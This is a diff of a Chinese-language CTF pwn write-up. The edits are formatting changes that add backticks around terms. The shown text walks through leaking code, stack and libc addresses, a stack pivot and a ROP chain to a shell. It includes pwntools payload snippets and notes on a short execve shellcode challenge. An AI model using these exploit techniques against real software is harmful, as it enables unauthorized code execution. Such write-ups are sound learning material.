@@ -196,9 +196,9 @@ shell:
 可以看到有栈溢出但不多，可以猜到要用栈迁移，`checksec`后发现打开了`pie`，那么我们就需要获取很多东西，栈地址，`code`地址和`libc`的基址。
 可以发现能泄漏的地方是第一次`read`的`puts`函数，他会一直输出直到遇到`\x00`。
 那么思路就是，第一次循环内，用第一个`puts`先泄漏`code`段的地址获取`code`段的基址然后根据偏移就能得到`code`段的其他地址，在第二个`read`函数劫持返回回到开始，进入第二次循环。
-第二次循环，用`puts`函数泄漏`stack`段的地址，然后开始构造栈迁移并泄漏libc，然后构造ROP获取shell。
+第二次循环，用`puts`函数泄漏`stack`段的地址，然后开始构造栈迁移并泄漏`libc`，然后构造`ROP`获取`shell`。
 下面是逐步分析。
-第一步，泄漏code段地址。
+第一步，泄漏`code`段地址。
 ```python
 # payload1泄漏code段地址
 payload1 = b'a' * (0x28 - 1) + b'b'
@@ -208,9 +208,9 @@ func_addr = u64(p.recv(6).ljust(8, b'\x00'))
 func_base = func_addr - 0x10138d
 ```
 ![[Pasted image 20250211192422.png]]
-将前面填充后可以看到泄漏了code段的地址，偏移是0x10138d，然后就获取了code段的基址。
+将前面填充后可以看到泄漏了`code`段的地址，偏移是`0x10138d`，然后就获取了`code`段的基址。
 ![[Pasted image 20250211192546.png]]
-第二步，栈溢出劫持返回，让程序回到func的开头准备第二次泄漏。
+第二步，栈溢出劫持返回，让程序回到`func`的开头准备第二次泄漏。
 ```python
 # payload2回到func函数再次执行
 payload2 = b'a' * 0x28 + p64(ret) + p64(func_base + 0x101367)
@@ -218,7 +218,7 @@ p.recvuntil(b'berial: ')
 p.send(payload2)
 ```
 ![[Pasted image 20250211192821.png]]
-第三步，再次构造payload泄漏stack段的地址，为栈迁移做准备。
+第三步，再次构造`payload`泄漏`stack`段的地址，为栈迁移做准备。
 ```python
 # payload3泄漏栈地址
 payload3 = b'a' * (0x20 - 1) + b'c'
@@ -228,9 +228,9 @@ stack_addr = u64(p.recv(6).ljust(8, b'\x00'))
 log.success('stack_addr: ' + hex(stack_addr))
 ```
 ![[Pasted image 20250211193005.png]]
-第四步，泄露了stack段后开始着手构造栈迁移来泄漏libc基址。
+第四步，泄露了`stack`段后开始着手构造栈迁移来泄漏`libc`基址。
 ![[Pasted image 20250211193129.png]]
-查看栈上空间可以发现有__libc_start_main + 128，将栈迁移过去就可以再次利用puts来泄漏。(栈迁移详见我另一篇文章[[栈迁移]])
+查看栈上空间可以发现有`__libc_start_main + 128`，将栈迁移过去就可以再次利用puts来泄漏。(栈迁移详见我另一篇文章[[栈迁移]])
 ```python
 # payload4开始构造栈迁移泄漏libc基址
 payload4 = p64(stack_addr + 0xb0) + p64(func_base + 0x101229) + b'a' * 0x10 + p64(stack_addr - 0x30) + p64(leave_ret) + b'\x00' * 0x8
@@ -246,7 +246,7 @@ log.success('__libc_start_main_add: ' + hex(__libc_start_main_add))
 log.success('__libc_start_main_base: ' + hex(__libc_start_main_base))
 ```
 ![[Pasted image 20250211193505.png]]
-第五步，构造ROP获取shell。
+第五步，构造`ROP`获取`shell`。
 ```python
 libc_base = __libc_start_main_base - libc.sym['__libc_start_main']
 
@@ -326,7 +326,7 @@ shell：
 ![[Pasted image 20250211193735.png]]
 ## unjoke
 ![[Pasted image 20250211194038.png]]
-shellcode题，构造一个九字节以内的execve即可~~不会去问DeepSeek~~。
+`shellcode`题，构造一个九字节以内的`execve`即可~~不会去问DeepSeek~~。
 exp:
 ```python
 from pwn import *
